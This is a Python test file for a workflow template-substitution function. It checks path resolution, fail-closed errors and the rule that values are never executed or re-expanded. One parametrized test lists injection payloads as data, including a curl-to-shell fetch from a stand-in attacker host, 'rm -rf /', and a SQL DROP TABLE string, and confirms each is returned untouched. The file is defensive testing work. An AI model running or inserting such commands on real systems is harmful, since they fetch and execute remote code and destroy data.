"""Template value-substitution non-executability (spec §2.6, acceptance #4)."""

from __future__ import annotations

import pytest

from wfa.template.substitute import TemplateError, resolve_args, substitute


def test_whole_string_reference_preserves_type():
    ctx = {"event": {"pr": {"number": 7}}}
    assert substitute("${event.pr.number}", ctx) == 7
    assert isinstance(substitute("${event.pr.number}", ctx), int)


def test_embedded_reference_becomes_text():
    ctx = {"event": {"repo": "octo/repo"}}
    assert substitute("repo is ${event.repo}!", ctx) == "repo is octo/repo!"


def test_list_index_access():
    ctx = {"steps": {"s": {"output": {"items": ["a", "b", "c"]}}}}
    assert substitute("${steps.s.output.items.2}", ctx) == "c"


def test_nested_dict_and_list_recursion():
    ctx = {"event": {"repo": "r", "n": 3}}
    out = resolve_args({"a": "${event.repo}", "b": ["${event.n}", "x"]}, ctx)
    assert out == {"a": "r", "b": [3, "x"]}


def test_no_expression_evaluation():
    # An arithmetic-looking template is NOT evaluated; only ${path} refs resolve.
    ctx = {"event": {"n": 2}}
    assert substitute("${event.n} + ${event.n}", ctx) == "2 + 2"


@pytest.mark.parametrize(
    "malicious",
    [
        "$(curl attacker.sh|sh)",
        "`rm -rf /`",
        "${event.title}; DROP TABLE users;--",
        "{{7*7}}",
        "%x{whoami}",
    ],
)
def test_injection_shaped_input_is_inert(malicious):
    # A T4 value that *looks* like code is copied verbatim as data, never executed
    # and never re-parsed as a template.
    ctx = {"event": {"title": malicious}}
    assert substitute("${event.title}", ctx) == malicious


def test_resolved_value_is_not_recursively_templated():
    # If a resolved value itself contains ${...}, it stays literal (no re-expansion).
    ctx = {"event": {"title": "${secret}", "secret": "TOPSECRET"}}
    assert substitute("${event.title}", ctx) == "${secret}"


def test_unresolved_reference_fails_closed():
    with pytest.raises(TemplateError):
        substitute("${event.missing}", {"event": {}})


def test_index_into_scalar_fails():
    with pytest.raises(TemplateError):
        substitute("${event.repo.0}", {"event": {"repo": "r"}})


def test_bad_index_type_fails():
    with pytest.raises(TemplateError):
        substitute("${event.items.x}", {"event": {"items": ["a"]}})


def test_index_out_of_range_fails():
    with pytest.raises(TemplateError):
        substitute("${event.items.5}", {"event": {"items": ["a"]}})


def test_non_string_scalar_passes_through():
    assert substitute(42, {}) == 42
    assert substitute(True, {}) is True
